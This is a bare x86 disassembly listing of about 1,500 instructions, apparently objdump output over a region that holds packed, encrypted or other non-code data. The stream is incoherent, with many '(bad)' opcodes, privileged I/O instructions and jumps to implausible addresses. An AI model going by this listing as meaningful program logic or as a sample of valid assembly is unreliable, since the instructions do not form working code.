  413b10:	repz and ah,BYTE PTR [edx-0x27]
  413b14:	or     DWORD PTR ss:[esi+0x11],edx
  413b18:	push   edi
  413b19:	xlat   BYTE PTR ds:[ebx]
  413b1a:	mov    ds:0xdf057fef,al
  413b1f:	fstp   TBYTE PTR [eax-0x5cbcf696]
  413b25:	inc    ebx
  413b26:	xor    DWORD PTR [ebp+ecx*4-0x10],esp
  413b2a:	shr    DWORD PTR [ebx+0x11c05b7f],0xa9
  413b31:	add    dl,al
  413b33:	pop    ds
  413b34:	cmp    cl,al
  413b36:	ret    0xc49d
  413b39:	mov    esi,0x9193ce0e
  413b3e:	hlt    
  413b3f:	sbb    dl,bh
  413b41:	push   esp
  413b42:	test   DWORD PTR [ecx],ebx
  413b44:	mov    dh,0x65
  413b46:	dec    ecx
  413b47:	hlt    
  413b48:	add    ah,BYTE PTR [edi+ebx*2]
  413b4b:	xor    al,0x53
  413b4d:	aad    0xad
  413b4f:	test   eax,0xe2371b58
  413b54:	ins    BYTE PTR es:[edi],dx
  413b55:	add    BYTE PTR [eax+0x5c],al
  413b58:	retf   
  413b59:	ss cmc 
  413b5b:	inc    ebp
  413b5c:	push   ss
  413b5d:	sahf   
  413b5e:	jno    0x413bc3
  413b60:	mov    esi,0x10d77d58
  413b65:	enter  0xee27,0x8d
  413b69:	dec    esp
  413b6a:	outs   dx,DWORD PTR ds:[esi]
  413b6b:	(bad)  
  413b6c:	push   ss
  413b6d:	mov    BYTE PTR [edi-0x52e08ddb],cl
  413b73:	cmp    BYTE PTR [eax-0x4912bc65],cl
  413b79:	fisttp DWORD PTR [ebx+0x27]
  413b7c:	inc    ecx
  413b7d:	mov    ds:0xa6705eb6,al
  413b82:	mov    cl,0x7c
  413b84:	jmp    0x8041a755
  413b89:	rcr    DWORD PTR [edi],0x48
  413b8c:	or     al,0x50
  413b8e:	adc    al,BYTE PTR [ebx+0x37ff3191]
  413b94:	or     eax,0x23269912
  413b99:	stos   DWORD PTR es:[edi],eax
  413b9a:	fcomp  DWORD PTR [ebx-0x80]
  413b9d:	mov    edx,ds
  413b9f:	pop    ebp
  413ba0:	(bad)
  413ba5:	xor    BYTE PTR [edi+0x63],ah
  413ba8:	jno    0x413b6a
  413baa:	(bad)  
  413bab:	mov    dh,0xf5
  413bad:	dec    ebp
  413bae:	sub    al,0x28
  413bb0:	imul   esp,DWORD PTR [ebp+0x67b03ced],0x7
  413bb7:	(bad)  
  413bb9:	out    dx,eax
  413bba:	in     al,0x82
  413bbc:	(bad)  
  413bbd:	loop   0x413b50
  413bbf:	or     al,0xb4
  413bc1:	aaa    
  413bc2:	nop
  413bc3:	mov    DWORD PTR [eax],ecx
  413bc5:	bound  ebp,QWORD PTR [edx+0x49]
  413bc8:	jg     0x413b9c
  413bca:	mov    ebp,DWORD PTR [ecx]
  413bcc:	mov    esp,0x5f87eae
  413bd1:	scas   al,BYTE PTR es:[edi]
  413bd2:	test   cl,ah
  413bd4:	sub    ch,BYTE PTR [esi-0x75bb2fc0]
  413bda:	mov    BYTE PTR [edx],bl
  413bdc:	add    ecx,DWORD PTR [eax+edx*2-0x3acb5fc4]
  413be3:	mov    bh,0xd
  413be5:	(bad)  
  413be6:	sbb    cl,BYTE PTR [eax]
  413be8:	out    0x15,eax
  413bea:	repz test eax,0xe6237f5a
  413bf0:	inc    ecx
  413bf1:	push   ss
  413bf2:	je     0x413b8e
  413bf4:	cmp    bh,dl
  413bf6:	mov    ds:0x84262040,al
  413bfb:	and    esi,DWORD PTR [ecx+0x1f]
  413bfe:	adc    eax,0x8011ecdf
  413c03:	push   es
  413c04:	sahf   
  413c05:	jl     0x413baa
  413c07:	loope  0x413bbd
  413c09:	and    DWORD PTR [edi+0x7d],eax
  413c0c:	test   BYTE PTR [edx-0x38],cl
  413c0f:	cmp    al,0x6e
  413c11:	loope  0x413c2c
  413c13:	popf   
  413c14:	ss mov edx,0x93f24f80
  413c1a:	call   0xea5d3065
  413c1f:	cmc    
  413c20:	int3   
  413c21:	pop    edi
  413c22:	addr16 fadd st(3),st
  413c25:	stc    
  413c26:	sahf   
  413c27:	popa   
  413c28:	test   eax,0xf8653235
  413c2d:	fstp   QWORD PTR [eax+esi*4-0x734f452a]
  413c34:	push   0x7f04f475
  413c39:	fmul   st,st(5)
  413c3b:	mov    ebx,0xbc5ffe9
  413c40:	cs ja  0x413c5a
  413c43:	dec    ebx
  413c44:	push   ss
  413c45:	stos   BYTE PTR es:[edi],al
  413c46:	dec    ebp
  413c47:	xchg   DWORD PTR [esi+ebx*1-0x72cb4e01],ebx
  413c4e:	aas    
  413c4f:	loope  0x413c0d
  413c51:	call   0xb2d:0x78684a01
  413c58:	sub    ch,BYTE PTR [esi]
  413c5a:	dec    edx
  413c5b:	in     eax,dx
  413c5c:	or     BYTE PTR [ecx],cl
  413c5e:	(bad)  
  413c5f:	int    0x5d
  413c61:	fcmovne st,st(2)
  413c63:	add    eax,0xbc1f57ba
  413c68:	cmp    BYTE PTR [ecx+0x32043d3f],dl
  413c6e:	dec    esi
  413c6f:	in     al,0x3c
  413c71:	mov    esp,0x51db2b72
  413c76:	sub    al,0xc2
  413c78:	sub    eax,0xf7594fed
  413c7d:	push   0xfffffff0
  413c7f:	cwde   
  413c80:	cwde   
  413c81:	jbe    0x413ce1
  413c83:	jnp    0x413cf7
  413c85:	aas    
  413c86:	push   ebx
  413c87:	mov    eax,ds:0x4c0395bd
  413c8c:	sbb    al,ch
  413c8e:	xchg   DWORD PTR ds:0x65f21a49,ebx
  413c94:	repz std 
  413c96:	xor    DWORD PTR [edi],edx
  413c98:	fwait
  413c99:	les    ebx,FWORD PTR [ebp+0x66]
  413c9c:	adc    bl,BYTE PTR [edx-0x49]
  413c9f:	in     al,0x10
  413ca1:	in     al,dx
  413ca2:	outs   dx,DWORD PTR ds:[esi]
  413ca3:	jns    0x413cad
  413ca5:	mov    ebx,0x1ec02816
  413caa:	cmp    eax,0x4b612448
  413caf:	xchg   edi,ecx
  413cb1:	xor    eax,0x4bce71d0
  413cb6:	clc    
  413cb7:	in     eax,0xc3
  413cb9:	rcl    DWORD PTR [edx+0x39],1
  413cbc:	stos   DWORD PTR es:[edi],eax
  413cbd:	aad    0x35
  413cbf:	mov    cl,0x43
  413cc1:	or     BYTE PTR [ebp+0x59],cl
  413cc4:	mov    cl,0xc0
  413cc6:	inc    edx
  413cc7:	(bad)  
  413cc8:	jb     0x413cc1
  413cca:	gs push edx
  413ccc:	ret    0x737c
  413ccf:	sti    
  413cd0:	add    al,BYTE PTR [ebx+0x1da9a66a]
  413cd6:	psubusw mm2,QWORD PTR [ecx-0x5b]
  413cda:	pop    ebp
  413cdb:	ret    0xfa5c
  413cde:	sbb    cl,bl
  413ce0:	push   eax
  413ce1:	adc    dh,dh
  413ce3:	out    dx,eax
  413ce4:	push   ss
  413ce5:	aam    0x31
  413ce7:	ja     0x413c8d
  413ce9:	pop    esi
  413cea:	(bad)  
  413ceb:	mov    ebp,0xbd2dace6
  413cf0:	jmp    0x413ca4
  413cf2:	pop    ss
  413cf3:	adc    al,0xe
  413cf5:	aad    0x2c
  413cf7:	into   
  413cf8:	xchg   esi,eax
  413cf9:	stos   DWORD PTR es:[edi],eax
  413cfa:	xchg   ebp,eax
  413cfb:	or     eax,0x6ee6fd45
  413d00:	fbstp  TBYTE PTR [esi-0x44]
  413d03:	aas    
  413d04:	inc    edi
  413d05:	int3   
  413d06:	inc    ebp
  413d07:	cmc    
  413d08:	sub    edx,DWORD PTR [esi-0x2ad38fad]
  413d0e:	sbb    al,dh
  413d10:	mov    ebp,0x401e8e50
  413d15:	mov    ds:0x3ca1a58,al
  413d1a:	repz rcl BYTE PTR [edx],0x39
  413d1e:	or     BYTE PTR [edi],0x4c
  413d21:	pop    esp
  413d22:	mov    BYTE PTR [esi],cl
  413d24:	mov    esi,0xfe6fe60
  413d29:	mov    bh,0x3d
  413d2b:	sub    edi,DWORD PTR [ebx-0x1e]
  413d2e:	pop    edi
  413d2f:	xor    ebx,DWORD PTR [esi-0x74]
  413d32:	sub    ebp,0x4ee24bc9
  413d38:	and    ch,dl
  413d3a:	push   es
  413d3b:	andnps xmm3,XMMWORD PTR [ebx-0x32]
  413d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d40:	xor    ch,al
  413d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d43:	repnz add DWORD PTR [ebx],ebx
  413d46:	and    esi,ebp
  413d48:	(bad)  
  413d49:	nop
  413d4a:	iret   
  413d4b:	scas   eax,DWORD PTR es:[edi]
  413d4c:	pop    ds
  413d4d:	and    ah,dh
  413d4f:	or     al,0x38
  413d51:	rcr    DWORD PTR [ebx+ebp*2],cl
  413d54:	pop    ebp
  413d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d56:	out    dx,al
  413d57:	pop    edx
  413d58:	inc    ecx
  413d59:	test   dh,0x67
  413d5c:	mov    ebx,0xbf2fc74b
  413d61:	jge    0x413d3a
  413d63:	mov    BYTE PTR [ebx],ch
  413d65:	adc    eax,0xbd396b04
  413d6a:	mov    edi,0x7b47d983
  413d6f:	mov    esi,0xea386338
  413d74:	das    
  413d75:	mov    eax,0xb86037c7
  413d7a:	jmp    0x9a32a988
  413d7f:	into   
  413d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d81:	loopne 0x413dac
  413d83:	cmp    ch,BYTE PTR [eax]
  413d85:	cmp    edi,ecx
  413d87:	test   BYTE PTR [ebp-0x6f],cl
  413d8a:	sub    DWORD PTR [edx+0x5372aa90],ecx
  413d90:	add    al,0x41
  413d92:	sbb    ebx,ebp
  413d94:	arpl   WORD PTR [edi-0x116ec509],ax
  413d9a:	out    0x2d,al
  413d9c:	into   
  413d9d:	jnp    0x413da9
  413d9f:	(bad)  
  413da0:	fadd   QWORD PTR ds:0xdd84115c
  413da6:	inc    edx
  413da7:	cmp    BYTE PTR [esi+eax*4-0x11],ch
  413dab:	aad    0x7f
  413dad:	lock sbb edx,esp
  413db0:	and    al,0x8
  413db2:	repz mov edx,0xa31f81d9
  413db8:	jg     0x413d48
  413dba:	mov    dl,0xd4
  413dbc:	mov    bl,bh
  413dbe:	cmp    dh,BYTE PTR [edx-0x13]
  413dc1:	xchg   edx,eax
  413dc2:	push   ebp
  413dc3:	pop    ss
  413dc4:	mov    ?,esi
  413dc6:	add    ecx,ecx
  413dc8:	cmp    ebp,DWORD PTR [eax+0x1ab7f2c2]
  413dce:	dec    ebp
  413dcf:	scas   al,BYTE PTR es:[edi]
  413dd0:	js     0x413d60
  413dd2:	enter  0x3279,0x95
  413dd6:	adc    esp,DWORD PTR [edx+edx*2+0x67]
  413dda:	in     eax,0xc4
  413ddc:	iret   
  413ddd:	rcr    DWORD PTR [ecx+0x6ad1a18f],0x23
  413de4:	ins    DWORD PTR es:[edi],dx
  413de5:	js     0x413dcb
  413de7:	xor    eax,0x2cf8a1a3
  413dec:	xchg   esp,eax
  413ded:	mov    esp,0x366b65ff
  413df2:	adc    al,0xba
  413df4:	sbb    al,0xac
  413df6:	imul   ebx,DWORD PTR [esi-0x3c4cf20b],0x37a2b11d
  413e00:	push   es
  413e01:	sub    al,0x41
  413e03:	mov    edi,0x9738c203
  413e08:	lahf   
  413e09:	daa    
  413e0a:	mov    bl,0xf7
  413e0c:	inc    ebp
  413e0d:	mov    dh,BYTE PTR [ebp+0x40]
  413e10:	or     DWORD PTR [eax+0x32],0x20
  413e14:	jecxz  0x413d9c
  413e16:	jle    0x413da7
  413e18:	dec    ebx
  413e19:	popa   
  413e1a:	repnz sbb DWORD PTR [eax],edi
  413e1d:	dec    esi
  413e1e:	or     dl,dl
  413e20:	or     BYTE PTR [eax+0xbec405f],bh
  413e26:	mov    bl,0x26
  413e28:	ret    0x9e9c
  413e2b:	dec    ecx
  413e2c:	das    
  413e2d:	push   ebp
  413e2e:	js     0x413dc8
  413e30:	mov    ds:0x303c811e,eax
  413e35:	cmp    eax,0x11379df9
  413e3a:	pop    edi
  413e3b:	into   
  413e3c:	ins    BYTE PTR es:[edi],dx
  413e3d:	cmp    ebx,DWORD PTR [ebx]
  413e3f:	imul   edx,DWORD PTR [esp+edi*2-0x75],0xc0a65eba
  413e47:	sbb    dh,BYTE PTR [edx-0x1f561a54]
  413e4d:	cs jle 0x413e8c
  413e50:	push   ebp
  413e51:	mov    dl,0x45
  413e53:	sub    edi,DWORD PTR [ebp-0x104318cc]
  413e59:	icebp  
  413e5a:	(bad)  
  413e5b:	in     eax,0xf3
  413e5d:	aaa    
  413e5e:	iret   
  413e5f:	push   ebp
  413e60:	xchg   ebp,eax
  413e61:	mov    BYTE PTR [ebx],dl
  413e63:	fist   WORD PTR [ecx+eax*1-0x6f]
  413e67:	and    esp,DWORD PTR [edi-0x60]
  413e6a:	neg    BYTE PTR [edi+0x60]
  413e6d:	cld    
  413e6e:	(bad)  
  413e6f:	jmp    0x413e65
  413e71:	pop    eax
  413e72:	pusha  
  413e73:	pop    ebx
  413e74:	neg    BYTE PTR [ebp+esi*2-0x54]
  413e78:	sbb    eax,0x60103d38
  413e7d:	icebp  
  413e7e:	cmp    eax,0x6e173dd0
  413e83:	or     eax,0xa465aa16
  413e88:	nop
  413e89:	ja     0x413e1b
  413e8b:	int    0x84
  413e8d:	add    al,0x22
  413e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e90:	dec    cx
  413e92:	jg     0x413e98
  413e94:	pop    ecx
  413e95:	push   cs
  413e96:	(bad)  
  413e97:	pop    ebp
  413e98:	ror    DWORD PTR [edx],cl
  413e9a:	sbb    ebp,DWORD PTR [edx+0xe]
  413e9d:	xchg   ebx,eax
  413e9e:	test   DWORD PTR ds:0xba6c1774,esp
  413ea4:	add    eax,0xe2a25f64
  413ea9:	imul   esi,ebp,0x6a
  413eac:	ss (bad) 
  413eae:	cld    
  413eaf:	mov    eax,ds:0x659acee
  413eb4:	mov    ds:0x78121745,eax
  413eb9:	les    edi,FWORD PTR [esp+edi*8]
  413ebc:	and    ah,cl
  413ebe:	scas   eax,DWORD PTR es:[edi]
  413ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec0:	ret    0x7f3e
  413ec3:	xor    BYTE PTR [edx],bh
  413ec5:	(bad)  
  413ec6:	and    eax,0xc450e3f3
  413ecb:	loop   0x413e9e
  413ecd:	sub    DWORD PTR [esi],esp
  413ecf:	(bad)  
  413ed1:	sub    DWORD PTR [ebp+0x7dd4620d],0xe55fd8e
  413edb:	leave  
  413edc:	and    al,0x34
  413ede:	imul   edx,DWORD PTR [edi*4+0x2fc11dab],0xb34e8236
  413ee9:	clc    
  413eea:	repnz fmul st,st(1)
  413eed:	hlt    
  413eee:	pop    es
  413eef:	xchg   edx,ebx
  413ef1:	mov    es,WORD PTR [ebx+0x4edc1e33]
  413ef7:	sub    DWORD PTR [ecx+0x4e757130],esp
  413efd:	or     eax,0x161e422e
  413f02:	jae    0x413f09
  413f04:	(bad)  
  413f05:	test   eax,0xe606e4ce
  413f0a:	repz cli 
  413f0c:	mov    ecx,0x19fc6e00
  413f11:	outs   dx,BYTE PTR ds:[esi]
  413f12:	rcr    BYTE PTR [ecx],1
  413f14:	push   edx
  413f15:	lods   eax,DWORD PTR ds:[esi]
  413f16:	das    
  413f17:	addr16 adc BYTE PTR [si],0xd1
  413f1c:	out    0x88,al
  413f1e:	movd   mm2,DWORD PTR [eax-0x223685b5]
  413f25:	icebp  
  413f26:	lea    ebp,[esi]
  413f28:	dec    eax
  413f29:	push   0xffffffcc
  413f2b:	jnp    0x413ec9
  413f2d:	add    DWORD PTR [edx+edx*8-0x10],esi
  413f31:	push   es
  413f32:	hlt    
  413f33:	jmp    0xb3d1:0xf6aa826
  413f3a:	enter  0x94ea,0x67
  413f3e:	adc    cl,BYTE PTR ds:0xbbcd6e32
  413f44:	xor    esp,DWORD PTR [eax]
  413f46:	push   edx
  413f47:	push   ecx
  413f48:	test   BYTE PTR [eax-0x54e3da9],ah
  413f4e:	icebp  
  413f4f:	shr    BYTE PTR [eax],0x16
  413f52:	adc    DWORD PTR ds:0x43af7e2b,ecx
  413f58:	jbe    0x413eff
  413f5a:	jb     0x413fb5
  413f5c:	sub    al,0xc0
  413f5f:	adc    al,0xfd
  413f61:	into   
  413f62:	test   bh,cl
  413f64:	jecxz  0x413faf
  413f66:	inc    eax
  413f67:	jl     0x413fa2
  413f69:	jecxz  0x413f76
  413f6b:	jb     0x413fa9
  413f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f6e:	icebp  
  413f6f:	ds in  eax,0x4c
  413f72:	fidivr WORD PTR [eax+ecx*1]
  413f75:	xor    edi,ecx
  413f77:	ss call 0x27147adf
  413f7d:	(bad)  
  413f7e:	int    0x86
  413f80:	inc    ecx
  413f81:	inc    ecx
  413f82:	(bad)
  413f85:	fdivr  DWORD PTR [esi+edi*1-0x30c2510c]
  413f8c:	imul   esp,DWORD PTR [esi],0xffffffab
  413f8f:	sbb    al,0xd9
  413f91:	inc    ecx
  413f92:	pop    ds
  413f93:	pusha  
  413f94:	cli    
  413f95:	ins    DWORD PTR es:[edi],dx
  413f96:	in     eax,dx
  413f97:	shl    DWORD PTR [edx-0x2914623],1
  413f9d:	or     BYTE PTR [ebp-0x6b562640],0x36
  413fa4:	push   0x6a
  413fa6:	xor    al,0x39
  413fa8:	jmp    0x88614453
  413fad:	sbb    dl,ch
  413faf:	clc    
  413fb0:	jecxz  0x413f9b
  413fb2:	dec    ecx
  413fb3:	jge    0x413fe5
  413fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fb6:	(bad)  
  413fb7:	fld    st(0)
  413fb9:	adc    esp,DWORD PTR [ebx+0x1a]
  413fbc:	sbb    al,0xc9
  413fbe:	dec    ecx
  413fbf:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  413fc1:	repz cmp DWORD PTR [ebp-0x44a2c05c],ecx
  413fc8:	jo     0x413f4d
  413fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fcb:	xor    edi,DWORD PTR [ecx+0x621f9f40]
  413fd1:	xor    ebp,DWORD PTR cs:[ebx]
  413fd4:	adc    cl,ah
  413fd6:	dec    edx
  413fd7:	cdq    
  413fd8:	mov    bh,0x59
  413fda:	add    al,al
  413fdc:	xor    dl,cl
  413fde:	mov    edi,0xd2d83f59
  413fe3:	and    edi,DWORD PTR [eax]
  413fe5:	jp     0x41405e
  413fe7:	fld    TBYTE PTR ds:0x9aa7cdf0
  413fed:	mov    bl,BYTE PTR [eax-0x38f9f46c]
  413ff3:	sbb    eax,0x4c2351fb
  413ff8:	test   bl,dl
  413ffa:	xor    edx,ebp
  413ffc:	pusha  
  413ffd:	retf   
  413ffe:	mov    bl,0xa9
  414000:	jbe    0x413fd6
  414002:	adc    DWORD PTR [edx+0x72520614],ebx
  414008:	popf   
  414009:	test   eax,0x2b6a0abe
  41400e:	sub    al,0xd1
  414010:	stos   DWORD PTR es:[edi],eax
  414011:	ret    0x3ac8
  414014:	jb     0x413fd6
  414016:	jmp    0x413fc9
  414018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414019:	mov    bh,0xf0
  41401b:	add    al,0x12
  41401d:	sbb    eax,0x9778d42d
  414022:	(bad)  
  414023:	jo     0x413ff3
  414025:	xchg   ebp,eax
  414026:	out    dx,al
  414027:	push   ebp
  414028:	in     al,dx
  414029:	mov    edi,0x5df98a3
  41402e:	sbb    eax,0xf366f621
  414033:	mov    DWORD PTR [eax+0x2e],ebx
  414036:	sub    DWORD PTR [edx-0x126498d3],ebx
  41403c:	es daa 
  41403e:	mov    dh,0xb2
  414040:	dec    edi
  414041:	nop
  414042:	and    DWORD PTR ds:0x3d809dd7,edi
  414048:	sub    bl,BYTE PTR [eax-0x50]
  41404b:	popf   
  41404c:	and    BYTE PTR [esi-0x36],0xda
  414050:	and    DWORD PTR ds:0x92409242,0x1cfc0572
  41405a:	dec    edx
  41405b:	popf   
  41405c:	out    0x41,eax
  41405e:	sbb    eax,DWORD PTR [edx]
  414060:	mov    eax,ds:0xef57a742
  414065:	retf   
  414066:	and    edx,ebp
  414068:	push   ss
  414069:	xchg   ebp,eax
  41406a:	add    eax,0x95a33ac2
  41406f:	mov    ebp,0xa528765f
  414074:	imul   eax,DWORD PTR [edx-0xdb5ba06],0xffffffa5
  41407b:	out    0x71,eax
  41407d:	(bad)  
  41407e:	push   ebp
  41407f:	or     ch,BYTE PTR [eax+0x4d]
  414082:	fwait
  414083:	int    0x28
  414085:	cmp    al,0x97
  414087:	repz sub DWORD PTR ds:[edi-0x62],esp
  41408c:	inc    al
  41408e:	fsub   QWORD PTR [esi+0x5bdc85c1]
  414094:	popf   
  414095:	pop    ds
  414096:	fadd   DWORD PTR [esi-0x4b44f8da]
  41409c:	test   eax,0x42d0dd03
  4140a1:	nop
  4140a2:	out    0x8d,eax
  4140a4:	xlat   BYTE PTR ds:[ebx]
  4140a5:	inc    ebp
  4140a6:	out    0x6d,eax
  4140a8:	cdq    
  4140a9:	cwde   
  4140aa:	int3   
  4140ab:	mov    BYTE PTR [esi+ecx*8-0x7e],0xf9
  4140b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140b1:	cmp    al,0x47
  4140b3:	iret   
  4140b4:	popa   
  4140b5:	popa   
  4140b6:	inc    esi
  4140b7:	into   
  4140b8:	ret    0x19ee
  4140bb:	sbb    ebx,DWORD PTR [edi+0x51503640]
  4140c1:	mov    al,ds:0xdf122bf9
  4140c6:	out    dx,al
  4140c7:	retf   
  4140c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140c9:	out    0x8b,al
  4140cb:	inc    esp
  4140cc:	push   ecx
  4140cd:	cwde   
  4140ce:	aam    0xe0
  4140d0:	sahf   
  4140d1:	mov    DWORD PTR [eax],0x2f1754b0
  4140d7:	(bad)  
  4140d9:	lock sar bl,cl
  4140dc:	pop    ss
  4140dd:	dec    eax
  4140de:	push   0x68
  4140e0:	hlt    
  4140e1:	cmp    ecx,DWORD PTR [edx-0x17]
  4140e4:	rol    BYTE PTR [ebp+0x42],cl
  4140e7:	jmp    0x1252:0xa911c6b9
  4140ee:	xchg   esp,eax
  4140ef:	scas   eax,DWORD PTR es:[edi]
  4140f0:	jae    0x41408d
  4140f2:	dec    esp
  4140f3:	mov    ebx,0x91b2a379
  4140f8:	jbe    0x4140a3
  4140fa:	(bad)  
  4140fb:	jl     0x41409d
  4140fd:	call   0xb55:0xed6edac0
  414104:	shl    BYTE PTR [edx+0x1],1
  414107:	fadd   QWORD PTR [edx+ecx*2+0xea4995c]
  41410e:	stos   DWORD PTR es:[edi],eax
  41410f:	das    
  414110:	cmc    
  414111:	(bad)  
  414112:	lods   al,BYTE PTR ds:[esi]
  414113:	push   ss
  414114:	and    al,0x97
  414116:	test   BYTE PTR [edi-0x10],cl
  414119:	jmp    0x414116
  41411b:	loope  0x4140c7
  41411d:	scas   al,BYTE PTR es:[edi]
  41411e:	xor    edx,ebp
  414120:	mov    al,ds:0x7f807128
  414125:	pop    ebx
  414126:	adc    eax,0x8d4b1340
  41412b:	cmc    
  41412c:	lock push esi
  41412e:	jl     0x41410d
  414130:	mov    al,0xdc
  414132:	inc    esi
  414133:	pop    edi
  414134:	xchg   esp,eax
  414135:	sbb    esp,DWORD PTR [eax+0x8b58178]
  41413b:	(bad)  
  41413c:	shl    al,0xcf
  41413f:	add    BYTE PTR [esi+eiz*4+0x5a],ch
  414143:	test   DWORD PTR [eax-0x54d6621],ebx
  414149:	jmp    0xb2f8ec7d
  41414e:	pusha  
  41414f:	(bad)
  414153:	jmp    0x4141b7
  414155:	mov    esp,0xc0c8471a
  41415a:	(bad)  
  41415b:	int    0x7
  41415d:	xchg   ebp,eax
  41415e:	loop   0x414171
  414160:	ss push edx
  414162:	js     0x4141e2
  414164:	inc    BYTE PTR [esi+0x64]
  414167:	scas   al,BYTE PTR es:[di]
  414169:	sub    eax,0x86f90290
  41416e:	mov    ch,0xee
  414170:	push   cs
  414171:	xchg   DWORD PTR [ebx],ecx
  414173:	sti    
  414174:	sahf   
  414175:	(bad)  
  414176:	gs add ch,al
  414179:	pop    ss
  41417a:	jl     0x414168
  41417c:	ret    0xbeb3
  41417f:	mov    WORD PTR [eax],ss
  414181:	dec    esp
  414182:	xor    DWORD PTR ss:[edx-0x7f],ebp
  414186:	ins    BYTE PTR es:[edi],dx
  414187:	pop    ss
  414188:	or     BYTE PTR [esi+0x4cc8b236],ah
  41418e:	sbb    DWORD PTR [edi-0xd],0x21f0d0af
  414195:	xchg   ebp,eax
  414196:	push   ds
  414197:	pop    ds
  414198:	in     eax,0xf2
  41419a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41419b:	sub    DWORD PTR [edi+0x38],ecx
  41419e:	ins    DWORD PTR es:[edi],dx
  41419f:	lea    eax,[ebx+0x6a2ecb6d]
  4141a5:	mov    ch,0xbf
  4141a7:	gs dec ecx
  4141a9:	mov    ebx,0xb71da910
  4141ae:	clc    
  4141af:	imul   eax
  4141b1:	sti    
  4141b2:	aam    0x91
  4141b4:	xchg   edx,eax
  4141b5:	inc    esi
  4141b6:	sub    DWORD PTR [edi-0x1a],edx
  4141b9:	iret   
  4141ba:	nop
  4141bb:	mov    ecx,0x2bc0167f
  4141c0:	add    eax,0x2ec8db9b
  4141c5:	es push ss
  4141c7:	pop    ss
  4141c8:	push   edi
  4141c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ca:	stos   BYTE PTR es:[edi],al
  4141cb:	imul   eax,DWORD PTR [esi+0x5e],0x7d
  4141cf:	(bad)  
  4141d0:	xor    ecx,DWORD PTR [eax-0x7dc11adb]
  4141d6:	cmc    
  4141d7:	and    BYTE PTR [esi+0x3b],0x26
  4141db:	and    bh,BYTE PTR [eax-0x5e]
  4141de:	neg    BYTE PTR [ebx]
  4141e0:	fwait
  4141e1:	dec    edx
  4141e2:	or     eax,DWORD PTR [ebx]
  4141e4:	fs cwde 
  4141e6:	xlat   BYTE PTR ds:[ebx]
  4141e7:	repnz mov WORD PTR [eax+0x7460542f],fs
  4141ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ef:	stos   DWORD PTR es:[edi],eax
  4141f0:	(bad)  
  4141f2:	rol    cl,0x69
  4141f5:	dec    esi
  4141f6:	fwait
  4141f7:	ins    DWORD PTR es:[edi],dx
  4141f8:	xchg   ecx,eax
  4141f9:	mov    al,0xde
  4141fb:	adc    al,0x18
  4141fd:	test   DWORD PTR [edx+0x55],edx
  414200:	ins    BYTE PTR es:[edi],dx
  414201:	ins    BYTE PTR es:[edi],dx
  414202:	mov    ebx,0x9c969e9a
  414207:	mov    ebx,0xba41784d
  41420c:	fst    QWORD PTR [edx-0x19]
  41420f:	cwde   
  414210:	retf   
  414211:	test   al,0x8f
  414213:	(bad)  
  414214:	loope  0x414266
  414216:	dec    DWORD PTR [edx-0xa878e55]
  41421c:	or     edx,edi
  41421e:	mov    ebp,0x1dc442fa
  414223:	sar    bh,1
  414225:	stos   DWORD PTR es:[edi],eax
  414226:	cmp    DWORD PTR [ebx-0x61],0xce76fb95
  41422d:	mov    ecx,0xd6a33574
  414232:	rcr    DWORD PTR [esp+esi*4],1
  414235:	cs xchg esi,eax
  414237:	xchg   edx,eax
  414238:	std    
  414239:	test   eax,0x6a857994
  41423e:	outs   dx,DWORD PTR ds:[esi]
  41423f:	sub    DWORD PTR [edi],esp
  414241:	xchg   edi,eax
  414242:	mov    DWORD PTR [ecx],esi
  414244:	scas   eax,DWORD PTR es:[edi]
  414245:	push   ecx
  414246:	dec    ecx
  414247:	and    al,0x5a
  414249:	dec    esp
  41424a:	stc    
  41424b:	fs inc ebp
  41424d:	push   ebx
  41424e:	push   0x3f
  414250:	xchg   DWORD PTR [ebp+0x5affc979],eax
  414256:	dec    edx
  414257:	dec    edx
  414258:	rol    DWORD PTR [edi],cl
  41425a:	rol    ecx,1
  41425c:	jnp    0x4141f0
  41425e:	push   ecx
  41425f:	mov    eax,0xf4952553
  414264:	adc    DWORD PTR [ebp-0x1d],eax
  414267:	pop    ecx
  414268:	mov    edx,0x2c49e156
  41426d:	pop    esi
  41426e:	jb     0x4142a1
  414270:	daa    
  414271:	mov    edi,0x3678599b
  414276:	mov    ebp,0x4e84290d
  41427b:	mov    esi,0xa2ab258f
  414280:	mov    WORD PTR [ebx+0x540737a0],cs
  414286:	jg     0x4142a7
  414288:	ror    bh,cl
  41428a:	loope  0x414297
  41428c:	aaa    
  41428d:	jno    0x4142ff
  41428f:	(bad)  
  414290:	fimul  DWORD PTR [ecx+0x17]
  414293:	push   ebp
  414294:	in     eax,dx
  414295:	fst    QWORD PTR [ecx-0x10]
  414298:	pop    ds
  414299:	pushf  
  41429a:	rcl    BYTE PTR fs:[ecx-0x32],cl
  41429e:	xchg   esp,eax
  41429f:	inc    ebp
  4142a0:	aad    0x32
  4142a2:	inc    eax
  4142a3:	mov    ebp,ebp
  4142a5:	adc    DWORD PTR [edi+0x7209af92],edi
  4142ab:	jb     0x4142fb
  4142ad:	inc    ecx
  4142ae:	push   ds
  4142af:	jecxz  0x414312
  4142b1:	in     al,dx
  4142b2:	fs loop 0x414285
  4142b5:	or     al,0x84
  4142b7:	jmp    0x4142c9
  4142b9:	xor    al,0xa3
  4142bb:	xchg   edx,eax
  4142bc:	push   es
  4142bd:	aam    0x27
  4142bf:	push   es
  4142c0:	fisttp DWORD PTR [eax+0x78eedb93]
  4142c6:	hlt    
  4142c7:	xor    BYTE PTR [ecx-0x26f70576],ch
  4142cd:	and    al,0x88
